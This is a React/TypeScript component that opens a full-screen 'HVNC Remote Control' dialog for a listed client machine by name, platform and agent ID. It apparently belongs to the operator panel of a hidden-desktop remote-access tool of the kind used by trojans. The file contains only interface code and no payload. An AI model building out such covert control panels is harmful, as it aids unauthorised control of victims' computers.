import { Dialog, DialogContent, DialogTitle, DialogDescription } from './ui/dialog';
import { VisuallyHidden } from '@radix-ui/react-visually-hidden';
import HvncControl from './HvncControl';

interface Client {
  id: string;
  computerName: string;
  platform: string;
}

interface HvncModalProps {
  client: Client;
  isOpen: boolean;
  onClose: () => void;
}

export default function HvncModal({ client, isOpen, onClose }: HvncModalProps) {
  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent 
        className="max-w-[95vw] w-full h-[95vh] p-0 bg-gradient-to-br from-[#131824]/95 to-[#1e2538]/95 backdrop-blur-2xl border-[#00d9b5]/30 overflow-hidden"
        style={{
          boxShadow: '0 20px 60px 0 rgba(0, 217, 181, 0.3), inset 0 1px 1px 0 rgba(255, 255, 255, 0.1)'
        }}
      >
        <VisuallyHidden>
          <DialogTitle>HVNC Remote Control - {client.computerName}</DialogTitle>
          <DialogDescription>
            Remote desktop control for {client.computerName} ({client.platform})
          </DialogDescription>
        </VisuallyHidden>
        <HvncControl 
          agentId={client.id} 
          platform={client.platform} 
          onClose={onClose} 
        />
      </DialogContent>
    </Dialog>
  );
}